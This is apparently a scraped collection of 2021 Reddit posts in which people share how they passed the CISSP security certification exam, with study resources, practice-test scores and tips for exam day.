I took the exam back in 2016 and failed.. I had taken a boot camp and thought I was ready, but I wasn’t and I didn’t have the right mindset going in. Of course I took the test in the old format so I mentally prepared myself for the new style this go round.

In terms of study….
-I read CISSP for dummies back in September and started flagging areas I needed to do further research on to understand. I identified a study plan and then I tried to stick to that. I wasn’t as strict as I could’ve been during the holidays and beginning of the year, so I had to really buckle down the last month and a half/two months before the exam.

-sunflower: it was okay I mean I read a few times but it just wasn’t for me. Maybe the way the information was setup just couldn’t work for my thought process. But still good to glance at.

-Sybex book: I tried to read cover to cover but it was hard to get through after a while I started using it as reference for things I couldn’t grasp. I did do the practice questions too.

-BOSON: you can’t skip this. While the questions are overly technical they help reinforce and identify what you are weak on. Do each test once and that’s it. If you keep doing them repeatedly you won’t learn anything. Just use them to get a sense of where you are and make adjustments to your study plan accordingly.

-Thor’s courses on Udemy I listed to the audio of the videos to and from work for the last 6 weeks. I took the practice tests at the end of each chapter and at the end of each course.

-CISSP ALL IN ONE  by SHON HARRIS.. I loved this book. Absolutely loved this book because I felt it was easier to read just overall easier to digest. I did practice questions at the ends of each chapter and also read the bullet lists of quick tips at the end to refresh myself the day before the exam. 

-Thor’s hard questions. I purchased them as soon as they were released and took all four. Understand that these are really hard and you will likely score lower here than you have on other practice questions. I will admit I scored horribly but realized there were a few things I was getting confused on and that I really need to take time and review some areas I assumed I just knew because they were directly related to my day to day job. I reviewed them and even found diagrams online to help me better understand. I’m more of a visual person so after a while the text is just gibberish to me. Pictures help a hell of a lot.

-this leads me to cheat sheets. I found Comparitech’s sheets online and found them easier than sunflower to digest. Granted printing some of the domains did the cheat sheets no justice because it was too small to read. I have a large tv screen to view things so for me it was better to read digitally. 

-Kelly Handerhan’s Why You Will Pass the CISSP 10 minute video. I read it before I began my study plan and again this morning before the test. Let me tell you, she reinforces the mindset and encourages you to find that confidence from within to really tackle this exam and come out a winner.

The main thing I would say is find a way that works for you. Books, pictures, video, audio.. whatever. At the end of the day you can do it.. you can pass! Just give yourself time.",2021-06-29

566,o9m7p4,1st Attempt: Passed at Q101 ~100 minutes,"Morning All - 

Took and passed the CISSP this morning on my first attempt. If I can pass it on my first attempt, then any of you can. It took me around 100 minutes and 101 questions.

Like many have posted here before, the exam provided many challenging questions, and it felt like I was in the ring with Mike Tyson for 12 rounds. When the screen went blank after Q101 I was pretty nervous that I failed, because I did not feel that I was doing THAT well. However, I passed. Below is a little about me and how I prepared.

Of Note: It is key to remember that there are ""Developmental Questions"" embedded. Seeing those provided some challenges, but if you see some questions out of the ordinary or seem like content you did not see in your studies, do not worry. Additionally, I took the approach of the CAT is here to help. It is here to keep you from failing by providing questions to keep you at/near a passing score. I believe that mentally helped significantly.

567,oa1kel,Requiring bio-metrics for verification?,"In my country, I'm required to provide '100 points of ID' which is sufficient for most things including opening a bank account, or going to court. 

IMO Requiring bio-metrics such as hand-prints or for verification during assessments is not appropriate, both because it's a collection of private information but also because it's not in-line with the security requirement of the exam. I think CISSP needs to reevaluate this option. This is a complete invasion of privacy and not appropriate, make worse so by the fact that NO actual information is provided relating to restrictions or retention on the bio-metrics collected, this is in complete contradiction to the intended content within the damn exam!

571,o8vuxh,Passed first time. 113 questions in 90 minutes.,"I passed on 21/6 and have been processing my thoughts on the entire journey before posting here.

# Relevant background:

* **BSc in Computer Science** from the University of Manchester
* 5 yrs at **Cisco** working on threat intelligence
* 1 yr at **CyberArk** as Security PMO for R&D
* 1 yr at **Deloitte** as a Senior Cybersecurity Consultant
* 2 yrs at **Microsoft** as a Senior Content Developer for Azure security products

I started looking into CISSP in my time at CyberArk but only really kicked off my proper studying 8 months ago.

# Resources I used:

|Resource|Format/location|Notes|
|:-|:-|:-|
|How To Think Like A Manager for the CISSP Exam (Ahmed, Luke)|Kindle edition|Read cover to cover. I found the advice and framing very helpful. (8/10)|
|CISSP Official Study Guide, 8th edition |Physical book|Read first 100 pages then used as reference. I found the style a little dry, the size intimidating, and the content occasionally lacking - a few times I came to this subreddit in frustration about missing topics. (6/10)|
|CISSP Official Study Guide, 8th edition |Digital edition (via [oreilly.com](https://oreilly.com))|This was where I consumed more of the OSG and a full-text search of a book is SO much more useful than an index which only has partial coverage. (7/10) |
|Eleventh Hour CISSP, 3rd Edition |Audio book|Listened all the way through twice. (7/10) |
|CISSP Course by Shon Harris |Videos (via [oreilly.com](https://oreilly.com)) |I found it insufferable how she began EVERY SINGLE short video with the word 'Now'. Couldn't listen after I noticed this behavioural tic. (1/10) |
|CISSP, Second Edition by Sari Greene|Videos (via [oreilly.com](https://oreilly.com)) |She suffers from the same verbal tic as Shon Harris: an overreliance on the word ""Now"" as a way to start a sentence or segway between ideas. It's really annoying after a very short time and so I had to quit after lesson 6. She also can't say ""hierarchical"" (but repeatedly does so, leaving out the second 'c'). (3/10) |
|Kelly Handerhan's cybrary course |Cybrary|Excellent. (8/10) |
|Destination Certification's Mind Map series|YouTube|As others have said, I don't know how/why these are free. But they're freaking awesome. I took a week of study leave before the exam and these were the core part of that week. (10/10) |
|Prabh Nair's coffee shots |YouTube|Very helpful for filling specific knowledge gaps. And his exam summary tables are really useful. (8/10) |
|Inside Cloud and Security's CISSP Exam Cram|YouTube|Attacks and countermeasures, updates for the 2021 exam, and more. Great stuff. (8/10)|
|Kelly's Why you WILL pass the CISSP|YouTube|It's just a really useful reminder of the mindset. Watch it. (10/10)|
|Craig Cunningham ran a free online CISSP Review session|[Nomad-sec.com](https://Nomad-sec.com) |Really enjoyed this. I definitely benefited from the overall aproach and hearing him work through various ideas. (7/10)|
|[CISSPREP.net](https://CISSPREP.net) practice exams |[CISSPREP.net](https://CISSPREP.net)|Really useful. I took 3 of the 1 hr exams. (8/10)|
|Larry Greenblatt's ""CISSP 2020 Exam Tips""|YouTube|Superb! Watched this on the day of the exam and it really helped solidify the mindset. (10/10)|
|Darknet Diaries |Podcast by Jack Rhysider |Jack's got an interesting way of presenting stories and they're often a good application of the issues covered in the study material. Occasionally, he comes across as a little *too* disappointed that the criminals he's covering get punished. (7/10)|

# Thoughts on the value of this whole process:

I've read a lot of negativity about the cert. Plenty of people (including current CISSP holders) who really don't think it's worth the paper it's printed on. At times, it certainly feels more like a money-making operation than a real 'test' of your knowledge. The annual fee of $125 also feels very steep, and unrelated to the goals. The fact that it's payable in the first year when they've already had $700 for the exam also feels pretty unreasonable.

I wasn't impressed with the quality of the questions in the exam. One in particular had a typo that enormously impacted the meaning of the question. I can't go into details, but the way it was written made no sense and I had to infer the intention. I noted it for reporting afterwards but I was too pumped up from the end of the test to actually do anything on the day. 

So now I have my provisional pass, and I'll have to pay my annual subs, and the exam scraped the surface of my knowledge, but was it worth it? I genuinely think I'll only be able to answer that with the benefit of hindsight a few years from now.",2021-06-27

582,pabhis,Provisionally passed! Here's what worked for me.,"I provisionally passed!  I am posting this to give back because I found these kinds of posts motivating when I was preparing.  Also, it's a little cathartic.  Of course, your experience will be different but here's what worked for me.

For context, I have around 15 years of experience in cyber security technical and management roles, and had just never got around to doing the test.  Like others, booking a date helped sharpen my focus.  

I have experience in most of the domains except SDLC, so my study needs were to validate what I thought I knew and then to fill in gaps where I didn't have as much experience.  It turned out I had more gaps than expected in domains I thought I was strong in (eg. crypto), and fewer in the gaps where I thought I was weak (eg. SDLC).  I also have a lot of multiple choice test experience from other exams like the LSAT, and this definitely helped.

**My approach**

\- I did practice questions with the Pocket Prep app (now called IT & Security) to assess where I stood on the domains.

\- Then I zeroed in on my weak domains and topics I kept missing in practice.  I used ""70 Tips and Tricks for Mastering the CISSP Exam"" by R. Sarma Danturhi to get a good, concise overview of specific topics.

\- After reaching saturation on Pocket Prep I started doing the Boson practice exams.  I made careful notes from the Pocket Prep and Boson explanations of questions I missed, and made flashcards with a free app called Rolandos to drill on recurring gaps.

\- I prioritized rote memorization of only a handful of core concepts that practice exams showed I was likely to need.

**General advice**

\- **Plan and visualize your visit the day** before to minimize the mental load that will be on you that day.  Look up the exam site in google maps.  Check exterior and interior photos if there are any.  Figure out parking or transport and book in advance if you can.  Plan what you'll wear into the exam room which may be warm or cool (likely to be warm given the PCs used for the exams).  Gather your IDs (you likely need at least 2) and any needed supplies (water, protein bars, etc.) in a bag that can fit in a small storage locker.  Check Covid mask requirements.  

\- Prepare yourself mentally to do 150 questions and to push onward without hesitation or self-pity if you go past 100.  A pass is a pass.

\- To paraphrase Bruce Lee, avoid practicing while overly tired.  If I was too tired, my practice scores dipped, drove down my average, and demotivated me.  When this happened, I put everything away and came back the next day, but I also made sure this didn't become an easy excuse.

\- Don't cram.  The day before my exam, I stopped studying mid-day and binged Netflix with a bag of chips in the evening.  The morning of, I was tempted to do some last minute review but stopped.  I told myself 20-30 minutes of review wasn't going to make a difference and it didn't.

\- If you have to wear a mask, take time to find one you'll be comfortable in for 1-3 hours.

\- Be ready for some bad grammar on some questions and answers that impacts their meaning; you just have to deal with it as best you can.

\- Review at least one current study resource published within the last year to prevent you from being blindsided by a new cutting edge topic or technology.  I found Mike Chapple's LinkedIn videos good for this.

**What was useful**

\- The Pocket Prep app was my main weapon of choice.  It was on my phone so I could do a quick quiz whenever I had a few minutes of downtime.  I think this was critical to getting lots of reps in.  

\- The Boson practice exams were quite good because they were challenging and very different than the Pocket Prep questions.  It was a good way to double check I was where I thought I was on the domains, and it spotlighted some new topics I hadn't encountered before.  Check this subreddit for a current discount code before you buy.

\- Danturthi's book was good for concise summaries of key topics in each domain.  He also emphasizes reading questions carefully and refactoring them in your head to remove irrelevant language, which I thought was a sound approach.

\- I found Chapple's LinkedIn videos to be up to date, well presented, and detailed.  They were also indexed to make skipping to a specific subject easy.  However, I don't learn efficiently from videos so I mostly used these to zero in on specific topics.

\- Kelly Handerhan's ""Why You Will Pass"" is a free, short, and worthwhile YouTube watch, even if just to reinforce that you should think like a manager.  I am one, so this wasn't a stretch, but it is a critical mindset to bring into the exam.

\- There are some cheat sheet style summaries which are posted in this subreddit which I found to be helpful.

**What wasn't useful**

\- I did not find the official ISC2 study app to be useful.  It didn't offer different study modes or statistics, and I think the question banks in Pocket Prep and Boson are superior for learning the domains holistically.

\- I found Kelly Handerhan's Cybrary videos to be a bit too high level for me, but I think they would be a good entry point for someone new to the field.  Her videos are very down to earth and accessible.

\- I felt that the explanations in Pocket Prep and Boson adequately covered the Shon Harris and Chapple books, so I did not feel it necessary to buy them having drilled these apps.

For those who  are not yet ready for CISSP (CISSP is not a beginner certificate), it's ok,  you can try SSCP instead as a starting point, I would strongly recommended this (though it's not the path I have taken). But SSCP is a good interim step for you to prepare your CISSP if you don't have the full domain knowledge and experience. 

For those who are working on CISSP, good luck in your coming exam and certification!",2021-08-22

590,p8kknx,Passed at 150 8/18/21! Huge Thank You To this Sub and Few Lessons Learned,"I have been waiting to write this post for a long time. I'll try to keep it succint and useful.

Background: Retired Military with last 12 years in upper middle IT/Policy management.  Took a training camp CISSP boot camp one time a few years back before retiring. Didn't pass, it was the old 250 Q format and I scored a 600. Seeing as this course is now $5K I would not even consider it.

I knew it was passable so I set a goal to get it done. I didn't look to seriously complete that goal until around 3 months ago. Long before that I hung around this sub reading about people's successes and failures. I started in June, studied a few hours a day, with 80% of my study time devoted to the various question bank apps. I did these while on the stationary bike at the gym.

I probably bought EVERY resource on here and TRIED to get through all of them. Here's the rub...I DIDN'T NEED THEM ALL!!!  

This is where lessons learned come in, so here goes. 

1. Run your own race. Take a few practice tests and get a gauge on what you know. If you are scoring in the 50-60% rate at the start, you have a solid baseline to build on.
2. Once you get that baseline, SCHEDULE THE TEST. It is said so much here, but is the single biggest driver that will make you study.
3. THINK LIKE A MANAGER...but KNOW THE MATERIAL LIKE A TECHNICIAN. Just thinking like a manager will not get you through this test. There will be plenty of purely technical questions too.
4. The BEST study material/formats are the you ACTUALLY CONSISTENTLY DO. Don't waste money on stuff you aren't going to use. I have the shon harris book, sybex 8/9, the CBK...I got through about 30% of the content across all of these. The material bored me to tears. What I was able to consistently digest was practice questions with some delving to the books for problem areas. That said, know you will need to use SEVERAL sources...this is good for building your knowledge base, and getting used to different terms for the same thing. 
5. Don't take your practice test scores in relation to others here as some type of gospel as to whether you should test. Use them to gauge your knowledge. My highest score on Boson was 610, and my usual score was around 550. I only consistently scored in the 60s-70s on the Shon Harris online questions. Pocket prep was in the 70s too, only went up with repeat questions.
6. Do a PLEHORA of question across NUMEROUS sources. Not only does this build your knowledge base, it also builds your stamina for when you take the test. ALSO MEMORIZE the answers...people say don't that, but guess what, you are probably bound to get a few softball questions that you only get right because you memorized some obscure aspect of an answer. Learn why the answers are wrong but YES some rote memorization is required. You don't want to get a gimme vocabulary question wrong because you didn't do some basic memorizing.
7. Everyone's experience with the test is different! The test was definitely hard, but at no time did I feel like I was taking a different test that what I studied. It just fest like they worded the stuff differently. Pretty much 80% of my questions felt *vaguely familiar*.
8. Find a video bootcamp series or two and VIEW THEM IN THEIR ENTIRETY. I tried all of them and everyone learns different so you have to find the one that works for you. The right answer is the one you can get through, lol. I will just put my experience with these.                                                                         

*  Kelly Handerhan Cybrary, Rob Witcher(MindMap) --These people are doing the lord's work. I owe them largely for my pass
* Thor Pederson, I could not get through his udemy courses...hated his tests too...hhhmmm.
* Phrabh Nair -- couldn't get through his course
* Mike Chapple -- Nope couldn't get though his either
* Larry Greenblatt -- Maybe his live boot camp is better but the $99 package SUCKS! Dude is not funny! 80% nonsensical rambling, off topic banter and defensive driving class comedian level  humor, 20% actual usable insight into the test.
* That said I did at least 10% of every source I listed so take it for what that's worth.

This got real long real fast I guess the best advise is find the study materials that work for you, get a baseline and set a timeline to test, then STICK TO IT.

When you get weary, come here for motivation. That's it and THANK YOU!!!!!!!!!!",2021-08-21
591,p8he4a,Passed in 100 @ 100,"Took my exam today at 1PM and got a provisional pass!

I feel like I did a solid amount of preparation and I also work in the security assessment space so wanted to take a stab at it without much study time. I started July 17th and gave myself a month. I wasn't sure on how confident I would feel in that time frame so I actually didn't register until August 10th. At that point I felt pretty confident in being able to tackle the exam, but from 8/10-8/19 I was eat/sleep/breath CISSP (wife wasn't a fan lol). The exam was definitely interesting. My last certification was Security+ and AWS:CCP which both are super straight forward. I did not feel that way about the CISSP. My confidence level was high on only about 50% of the questions.  

I used the following material for prep: Books: 11th hour (read entire thing in last 48 hours), OSG 8th edition (probably spent less than an hour in this book over my course of studies), Luke Ahmeds 25 question book  Questions: Official Practice Tests 3rd edition (answered \~200 questions from here); Wiley Practice Tests (\~1000 questions); Pocket Prep (all 800, app is at 96% correct), Discord questions (a lot); ISC2 app (\~500 questions)  Videos: Kelly H. - Cybrary CISSP; Mike Chapple - LinkedinLearning; Destination Certification; CISSP Exam CRAM series; Prabh Nair, Luke Ahmed, etc.; every think like a manager video I could find :) The video content was probably 100% the reason I passed  Filled a 70 page notebook with things I was writing down from videos and books; probably wrote out BCP and SDLC process 10x each

On 6/12/2021 I managed to get a free voucher to take the CISSP exam, but it was set to expire at the end of August. I booked an exam at a local test center on 8/18/2021. I spent $0 on additional resources. I did get the ISC2 Official Practice Test book from a coworker who has his cert. My primary resource was I watched the [""CISSP Exam Cram"" videos on YouTube](https://www.youtube.com/playlist?list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD) but I only actually watched the videos for the first 6 domains and didn't watch any of those extra ones. I took the official practice tests for the videos I did watch and I was scoring in the 70%-80% range. I probably spent \~20-25 hours studying for the exam in total.

&#x200B;

At the end of the day, I either just got really lucky or experience actually does go a long way in preparing you for this exam (probably a little of both). If you're a professional in the field and have a reasonable amount of experience I would strongly suggest you just go for it because you may have a better chance of passing than you think (and maybe prepare a little better than I did).",2021-08-21

594,p837ym,Passed in 100,"Passed CISSP Exam yesterday August 19 2021 in 100 questions.

For prep I used the sybex study guide 8th edition, and the online sybex practice bank included with the guide.

I read for about 1-2 hours a night most nights over the course of about three months. I did the written reviews and in-book chapter reviews at the end of each chapter. 

The last 5 days before the test I switched to the online tests. I did all of the individual chapter questions first, identified my two weakest chapters and re-reviewed them.

Then switched to the practice exams and did about three, again flagging and reviewing any concepts I was unsure of.

The exam felt difficult. I thought I actually failed when it ended at 100. I worked by eliminating wrong answers and reasoning the best choice among valid answers remaining.

I took about 90 minutes.

My advice to those preparing for the exam would be to expect the exam to be more of a reasoning exercise than memorization. The online practice exams all feel very route oriented. The actual test for me felt much more applied and required critical thinking to make the best possible choice with the limited information available. Try not to assume any facts— if it’s not explicitly written in the question you can’t assume it exists. Interestingly this skill of making critical judgments with limited time and info is required by security professionals.

Good luck!

3. Prabh Nair’s YouTube Videos - Very important, Do not skip these videos.
4. Destination Certification YouTube Videos - Watched these videos many at times during preparation. Watched few videos night before exam also and they were spot on.
5. Mike Chapple last minute exam review
6. 11th hour CISSP and Memory palace by Prashant Mohan
7. And bunch of random Google search, Wikipedia, and YouTube videos.

Initially I started marking on book but soon I realized, it was going into my volatile memory. I needed it in my secondary memory so I started writing notes for each domain and they helped me a lot. This was the best decision of mine.

Group study on google meet for 2 weeks with 2 other aspirants. We studied for almost 3 hours daily and 8 hours on weekend just 3 weeks before the exam. Best part is, all 3 of us PASSED. I am sure they are reading my post right now ;)

My discord group is still active where many people are preparing to appear for the exam.

**About the exam:** It’s true that the real questions are different than the practice ones however; if your concept is clear then you would be able to rule out at least 2 options most of the time. Read questions carefully. Keep maximum 1 minute for each question and if you take more than that then cover that gap with the straight forward questions. Watch these 3 videos for the right mindset before you go for the exam–

Please focus on each topic and try to understand in detail. Write notes, read your notes daily, ask question to yourself and give answer to yourself. If you are satisfied with your answer, you are good to go. Pay special attention to words which have synonyms mentioned in the book.

Posted this elsewhere but looking for a few more opinions.

Thinking about cancelling my upcoming test (four days away). Was scoring in the 80's on the Sybex official practice exams and figured I was ready. Then I watched Larry Greenblatt's CISSP questions on youtube and got almost all of them wrong (always narrowed it down to the correct two and then chose the wrong one). Then I took Thor's Hard CISSP Questions exam on Udemy today and scored 60.  Perhaps I'm rushing the process. Been studying for about 10 weeks.

This would be my first attempt and is paid for. Any further attempts would be out of pocket, though the expense doesn't bother me too much. Any feedback would be much appreciated.",2021-08-15
618,p4dg4h,Another passed at 100 questions,"Passed yesterday after 100 questions in about 1 hour, 15 minutes. Background for me is about 14 years experience with virtualization, cloud computing, network security and consulting.

Spent 2 weeks studying for the SSCP and after passing that exam, spent another 6 weeks studying for the CISSP.  My study process was the following:

&#x200B;

* Read the AIO guide twice (should have read this second since it was more detailed than the official study guide)
* Read the official study guide fully once and skimmed through twice after
* Watched the Cybrary videos
* Watched the Mike Chapple CISSP linked in learning videos
* Watched the Prabh Nair CISSP videos
* Used the official Sybex practice questions, pocket prep questions and Boson questions
* Anytime I ran into topics I didn’t know, I would thoroughly research them
* Jotted down the order of difficult topics like BCP, Risk Management etc.

Now for the exam itself. First pointer is that I’d recommend your ID isn’t expired because I had to race back home and grab my passport which wasn’t fun.

Since this is an adaptive exam and the questions vary, I know some people have had an easy time with the exam and some people had a hard time with it. I had a hard time with it. After about 10 questions I was thinking to myself that I’m probably going to fail and there goes a lot of money down the drain. I also freaked out because I couldn’t see how I could possibly prepare more. But I took each question one at a time and used process of elimination to narrow down the choices and pick the most appropriate answer.   I heard that the questions start easy and get harder as you go but I had a mix of easy and hard questions.   The reason I found it so difficult was that the real questions were totally unlike the practice questions I was taking. The practice questions typically have 1 or 2 obvious answers, but there were about 40 questions that had all 4 answers as plausible. Designers of the practice questions really need to up the difficulty level on them.

Anyways, based on my experience, here are some tips:

&#x200B;

* There were many questions that used alternate terms for technology or controls, so pay attention to the study guide sections where they will say, “this term could also be called…”
* When you have 4 plausible answers, you really need to focus on the question and what it’s asking for: What is the most cost efficient, what provides the most protection (rather than detection) etc.
* It’s been said before but focus on answers that protect people, avoid risk and achieve desired management outcomes - sometimes that’s only way you can pick your answer
* Most of the questions were about concepts but you will see deeper technical questions thrown in so be prepared
* You will probably see concepts you’ve never seen or heard of before, and you’ll have to use your English comprehension skills to pick the one that sounds the most correct
* Focus a lot of your studying on how the technologies and security controls work together and why you would use them, rather than how they work
* A lot of the methodologies and frameworks are different for each organization but you should get a rough idea of what order certain activities will be carried out in
* Study everything - I had 3 questions on a topic that’s only a paragraph in most books

Hope this helps any future test goers.",2021-08-14
619,p4cpze,Chinny Chin CISSP,"Okay, a little context.  I'm a 30 year IT professional with the last 10 as a CIO.   As I get closer to retirement, I thought it would be interesting to see what I'd learned by pursuing some certifications and then maybe do some teaching/consulting in security when I'm ready to bag it.  I decided to do the following certs CISA, CISM, CISSP starting in June.  Passed CISA in June and was certified soon after, CISM in July and certified a week ago and today I took the CISSP.

Last week I was doing some consulting near Buffalo and had a flight home to South Carolina scheduled to arrive at 5:30pm yesterday.  Due to delays and canx I ended up getting home at 2am.  My CISSP exam was set for 9:30am this morning.  Barely got up in time, just made it to the test center half asleep, etc.  Anyway I provisionally passed in 2 hours.  (ISC) Squared folks were were nice enough to let me do 150 questions.  :)

I didn't do much prep for any of these......probably 10 hours for the CISA, maybe 15 for CISM and 20+ for the CISSP.  For CISSP I used Mike C's videosthat on linkedin learning, the Official Study Guide, Thor's free  videos and the MindMap videos on YT.  

I had very little encryption stuff on the exam, lots and lots of questions about role based access and her cousins, didn't have to use the calculator, the math was simple, lots of scenario questions (trick being to find the special word), more application security stuff then I expected, very little auditing, some governance and some process sequencing questions.  

Basically, the stuff I had to learn was really official ISACA and (ISC)2 terminology for things I'd been doing as a CIO/Director, etc., for years.  Strangely, the language on the test today seemed to written by somebody with a thesaurus on his/her desk.  Other than proving that I could read, I'm not sure what that accomplished.  The goal was supposed to be comprehending concepts but using weird sentence construction  and possibly invented adverbs struck me as very weird.  Anyway, that's nitpicking.

Last thought, I've seen a lot of comments and debates about ""which is harder"" between the CISM and the CISSP.  Got to say, neither one is what I'd call very hard but it is absolutely true the CISSP covers a great deal more information while ISACA seems to break it up between a few different exams.  Makes sense given the focus of the organizations is not the same.  I'd be happy to answer any questions about my experience today or before.  If not, congrats to those who have been certified and good luck to those that are working towards!",2021-08-14
620,p3xnl5,How can CISSP help me pivot towards management / policy making?,"I've been in Information Security for just over 3 years now, mostly doing AV, DLP, Config Management, Web Application Scanning, and Vulnerability Management among other things. I like technical, but I don't want to end up pigeon-holed doing just tech work.

I'd love to get more into the GRC side of things, and be more of a planner / policy maker, who puts the processes in place and evaluates more than actually pushing the buttons.

Anyone make a similar pivot with any advice?",2021-08-14
621,p3q71k,Passed at 150 questions yesterday.," I managed to hit a hanging curve yesterday and pass. 
  
###### I removed a bunch of information that may or may not be under NDA ######
  
I think what prepared me was looking up the answers to questions I missed when taking the practice tests, remembering the golden words, and the standbys like ""is the word from the question in the answer?"" etc. and SLOW DOWN! I finished in an hour and a half and I forced myself to read each question, all the answers COMPLETELY, and then the question again and try to pick it apart looking for words that were key to the answers. 3 hours is more than enough time so take your time.  
The questions weren't tricky, per se, but I had a few that would ask what would you do if you had a scenario where you had (condition 1) and (condition 2)?  And the conditions were basically the definition of (this term we studied). So you have to know the information to know what term is being asked.   
     
Some other notes from a peer that recently passed and I used:  
1-I created a crib sheet of the things I struggled with, wrote them by hand 4-5 times.  Memorized that enough that I spent the first 10 min writing out that sheet.  Honestly I only referred back to it 3-4 times but it at least got me started.   
2- I did a ""vocabulary"" exercise the day before the exam, where I just flipped through our course books and read words and defined them. I think that helped more than I know.    
3-  I took a few mental breaks during the exam to battle my impatience.  I would start to hurry and not read all the way through Q/A so I would stop and and stare at my desk for 30-60 seconds.  ""Brought me back"" to focus.

622,p3jdsz,"Obligatory ""passed at 103"" and some tips I haven't seen elsewhere","Passed today at 103!  Didn't have a lot of prior CISSP relevant experience (I have the required job experience, but most of my jobs barely touched on security topics).  The Security+ has about 50% overlap with the CISSP, and I highly recommend taking it first.  Consistently averaged 70-75% on all CISSP practice question banks across multiple platforms.  


Tips I haven't seen elsewhere:   
\-The test requires a good bit of reasoning / IQ test style stuff, and English comprehension.  A dozen questions had long paragraphs of information with one or two key words that totally changed the ""correct"" answer, so be sure you pay attention to *every single word* in the long format questions.

\-Skim the question, read the answers, then read the question carefully again.  The answers frequently tell you what part(s) of the long paragraph are the most important.

\-Brain dumping in the exam room: memorizing key acronyms/mnemonics, security models, OSI model, basic ports, encryption and hashing algos, other models, formulas, etc is a good idea.  When necessary, come up with your own ways to remember them rather than relying on frequently terrible mnemonics in books.  Once you're in the exam room, guess what!  You're allowed to brain dump everything you memorized on to paper!  This helped me save a lot of brain clock cycles, as I didn't have to run through everything I'd memorized mentally, and could glance at the paper for the relevant information. 

\-As Handerhan mentions, when ethical questions are at stake, lean towards the most ethical.  I don't want to elaborate further, but one question I got was really tailored to make me choose the ""unethical"" route, and IRL I likely would have - because I personally IRL knew the ""correct"" answer, and the ""unethical"" answer really wasn't unethical IRL -- but in the exam, you frequently have to work with the information presented in the question.  

\-About 3 of the questions were totally baffling.  I'd never read or heard about any of the concepts in the question or answers, and the question itself wasn't entirely clear.  Try to suss out what they're getting at, eliminate incorrect or non-real answers, and roll the dice.

\-Read the question and answers multiple times.  Every word.  Don't reflexively give the seemingly correct technical answer when an obfuscated better answer may exist.  

\-Seriously, a lot of it is reasoning.  Figure out the key points of the question, eliminate wrong answers, then make a detailed mental analysis of the remaining answers.

\-You will encounter questions you've no idea what the answer is.  Think on it for a few minutes (you have time), eliminate wrong answers, guess, and move on.  This isn't a test you must get a 90% on to pass.  Many options are debatable.  

\-When complex topographies are described, try to imagine it in your mind, with the flow of traffic.  But I'm a visual thinker, YMMV.

\-Day of the exam: schedule the exam for a time of day that you're usually mentally sharp, sleep well, eat light meals, take your usual amount of caffeine (I like L-theanine, a natural supplement extracted from green tea that calms caffeine and brain jitters - not woo woo, it is proven.)  Watch Greenblatt's 2018 and 2020 Exam Tips on YT, and Handerhan's ""why you will pass the CISSP.""  Get out of the IT grunt mindset and in to the master mindset.  Greenblatt's ""think like Kirk and Spock"" metaphor actually helped me on a couple questions.  I'd catch myself being too Spock-analytical, switch to Kirk mode, and the answer would pop out.  Wear comfortable yet professional clothes to the exam (a nice outfit can psychologically make you feel important and get in the mindset, IMO), wear a short sleeved shirt in case it's warm, and bring a light jacket in case it's cold.  

\-My personal pre-public speaking/important moment ritual: Take a minute or two to collect your thoughts and calm your mind.  Imagine yourself striding out successful.  Find a wall and stand against it and fix your posture.  Smile.  Feel the badassery flow through you.  YOU have come far enough and learned enough to sit for this $750 exam.  You can do it.  If you fail, there's always 30 days from now.  Breathe, stretch, fix your posture again, smile, and get to work!      


\-Read CISSP Sybex 8th edition once  
\-Listened to Inside Cloud and Security free youtube videos while in the car - they have great free pdfs of the slides for study - Mind Map videos are more entertaining to watch, but the shorter video format isn't conducive to car rides.  
\-Paid $20 for Pocket Prep for a month - it was useful to get info on what domains to focus on and to have a portable practice option.  Questions seemed very similar to the Sybex free questions.  A day before the exam, I went through and cleared out all the missed questions by getting them correct.  
\-Did a few hundred Sybex practice exam questions - would tab out and google stuff as needed to reinforce.  
\-These ""cheat sheets"" are also awesome: [https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf](https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf) (change the last number of the URL to 1 through 8 and download each)",2021-08-13

Background wise I only have a year of direct cyber security experience as a security analyst, and a year of sys admin experience before that, plus some security and management experience from way back in the day. I also have the Cybersecurity Bachelor's from WGU, and a bunch of other lower level certs (CCSP, SSCP, AWS SAA, Cysa+, A+, Sec+, Net+, PenTest+, Project+, ITIL, couple of garbage EC-Council certs).

As for studying, I went through a free CISSP boot camp thing that Syracuse University provides for veterans called Onward 2 Opportunity, which isn't much different than any of the 20 hour CISSP training courses on Udemy but it includes all of the official training and practice exam books (barely touched the extra resources) and an excessively in-the-weeds practice exam system through Percipio that helped with learning way too detailed information about things that didn't matter. I also read part of the 11th Hour study guide and went through some of the CISSP Practice Exam book by Shon Harris, like maybe a third of it. I was getting around 80% on practice exams before sitting the exam.
I also watched that ""Why you will pass the CISSP"" video everyone recommends before leaving for the exam today, and it definitely helped getting in the right mindset for the test.

The exam is what everyone says, it's hard and grueling but i approached it with a mangers mindset and got the job done!

For anyone who is struggling please know that I failed this exam before but this group inspired me to keep going, so thanks you all. 

For studying, i used a wide variety of material including a one week intense bootcamp which was very expensive - all paid for by work. If honest, I think the best was Thor Peterson online material with questions and Boson.

One piece of advice I'd like to share is simple. When studying you have to know the whole syllabus and how it connects. Sounds obvious but I failed on this before and i sacrificed on areas of knowledge I wasn't strong on and it cost me dearly.

Second, and last I promise, is track your progress. I kept weekly, daily scores of my test results broken down by domains to help visualise my strengths and weaknesses.  It helped loads.

629,p2pmjp,Passed CISSP,"Hello Everyone,

After studying for the past 4 or so months, I took the test this AM and passed on my first attempt. Very excited about this as I was very nervous and obviously heard how difficult it was pass. Although I was not confident until I received the printed copy on my way out that said ""Congratulations"", the exam felt very passible as I was going through it. However, once I got to question 100 and it kept going, I started really getting nervous. Once I got to question 120 or so, it kicked me out and I was happy to read that I passed.

A quick background on me. I started in IT back in 2005 as a college student doing desktop support/sys admin work and have been working in a security focused roll since 2012. The past 5 years, I have been working in risk management with GRC as my current roll. 
Now to get to what some of you may actually be interested in hearing about.

I signed up to take the exam on June 5th 2021 sometime in March 2021. Sign up or you won't actually commit to studying. The exam was 700 at the time (now it's 750 since they released the 2021 CBK on May 1st). I can't stress this enough, sign up and pay for the exam. Otherwise, don't waste your time.

I joined certification station on discord. Great community with resources, I recommend doing the same. Adam Gordon from IT Pro TV supports this channel an offers free boot camps to those interested. He also provides all his notes and information on this channel. You can grab it at anytime and just read through them. I was fortunate enough to catch the beginning of his CISSP boot camp which lasted 8 weeks (1 week per domain) at 4 hours/week (2 days/2 hours). Halfway through the boot camp, I realize the CBK was updated with lots of new material which spooked me so I pushed my exam from June 5th to August 11th.

